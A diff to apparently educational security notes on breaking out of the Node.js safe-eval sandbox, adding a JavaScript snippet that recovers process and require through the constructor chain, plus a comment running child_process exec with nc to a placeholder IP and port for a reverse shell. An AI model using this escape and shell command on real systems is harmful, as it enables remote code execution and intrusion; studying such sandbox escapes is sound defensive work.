@@ -41,6 +41,15 @@ sh.stderr.pipe(client);});
 - The provided context in the `safe-eval` makes this more difficult to work with, however unless the context is limited to ONLY primitive types, we can likely still break out of the sandbox by accessing the constructor of a non-primitive object in the context.
 - We can then use for `require` to get other dependencies (`child_process`), to execute `exec` to get a reverse shell.
 
+Getting `require` from `process`:
+
+```js
+process = this.constructor.constructor('return (function(){return process})()')();
+var require = process.mainModule.require;
+
+// then we can do require('child_process').exec('nc <IP> <PORT>');
+```
+
 Other useful resources for understanging the JavaScript sandbox workings:
 - https://www.wispwisp.com/index.php/2019/08/16/cve-2017-16088-poc/
 - https://odino.org/eval-no-more-understanding-vm-vm2-nodejs/
